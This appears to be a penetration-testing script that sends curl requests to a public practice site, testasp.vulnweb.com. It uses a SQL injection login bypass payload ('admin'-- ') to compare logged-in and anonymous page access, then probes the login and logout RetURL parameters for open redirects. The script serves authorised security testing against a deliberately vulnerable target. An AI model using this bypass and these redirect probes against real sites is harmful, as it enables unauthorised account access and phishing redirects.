#!/usr/bin/env bash
# r2_auth step 3+4: session observation (read-only) + open-redirect in RetURL
cd "$(dirname "$0")" || exit 1
U=http://testasp.vulnweb.com
set -x

### ---------- ② what the bypassed session grants (READ-ONLY GETs) ----------
# O1: Default.asp WITH bypassed session jar cj_s1 (uname = "admin'-- ")
curl -sS --max-time 20 -b cj_s1.txt -c cj_s1.txt -D hdr_o1_default_loggedin.txt -o body_o1_default_loggedin.html \
  "$U/Default.asp"
# O2: control Default.asp with NO cookie
curl -sS --max-time 20 -D hdr_o2_default_anon.txt -o body_o2_default_anon.html \
  "$U/Default.asp"
# O3: another page with the bypassed session (read-only)
curl -sS --max-time 20 -b cj_s1.txt -c cj_s1.txt -D hdr_o3_showforum_loggedin.txt -o body_o3_showforum_loggedin.html \
  "$U/showforum.asp?id=1"
curl -sS --max-time 20 -D hdr_o4_showforum_anon.txt -o body_o4_showforum_anon.html \
  "$U/showforum.asp?id=1"

### ---------- ③ open redirect ----------
# R0 CONTROL: RetURL present but creds bogus -> source says no redirect (inside not rs.EOF)
curl -sS -i --max-time 20 -c cj_r0.txt -D hdr_r0_returl_bogus.txt -o body_r0_returl_bogus.html \
  -X POST --data-urlencode "tfUName=nosuchuser_zzz" --data-urlencode "tfUPass=nosuchpass_zzz" \
  "$U/Login.asp?RetURL=http://example.com/"

# R1: SQLi bypass + RetURL -> expect 302 Location: http://example.com/
curl -sS -i --max-time 20 -c cj_r1.txt -D hdr_r1_sqli_plus_returl.txt -o body_r1_sqli_plus_returl.html \
  -X POST --data-urlencode "tfUName=admin'-- " --data-urlencode "tfUPass=x" \
  "$U/Login.asp?RetURL=http://example.com/"

# R2: protocol-relative
curl -sS -i --max-time 20 -c cj_r2.txt -D hdr_r2_protorel.txt -o body_r2.html \
  -X POST --data-urlencode "tfUName=admin'-- " --data-urlencode "tfUPass=x" \
  "$U/Login.asp?RetURL=//example.com/"

# R3: https absolute
curl -sS -i --max-time 20 -c cj_r3.txt -D hdr_r3_https.txt -o body_r3.html \
  -X POST --data-urlencode "tfUName=admin'-- " --data-urlencode "tfUPass=x" \
  "$U/Login.asp?RetURL=https%3A%2F%2Fexample.com%2F"

# R4: GET Login.asp?RetURL=... (control: GET must NOT redirect)
curl -sS -i --max-time 20 -D hdr_r4_get_returl.txt -o body_r4.html \
  "$U/Login.asp?RetURL=http://example.com/"

# R5: Logout.asp?RetURL= on a FRESH jar (session has no uname -> Remove is a no-op)
curl -sS -i --max-time 20 -c cj_r5.txt -D hdr_r5_logout_returl.txt -o body_r5.html \
  "$U/Logout.asp?RetURL=http://example.com/"

# R6: Logout.asp?RetURL= protocol-relative, fresh jar
curl -sS -i --max-time 20 -c cj_r6.txt -D hdr_r6_logout_protorel.txt -o body_r6.html \
  "$U/Logout.asp?RetURL=//example.com/"

# R7: GET Login.asp with an ABSOLUTE offsite in the menu RetURL (encoding check)
curl -sS --max-time 20 -D hdr_r7_menuencode.txt -o body_r7_menuencode.html \
  "$U/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F"
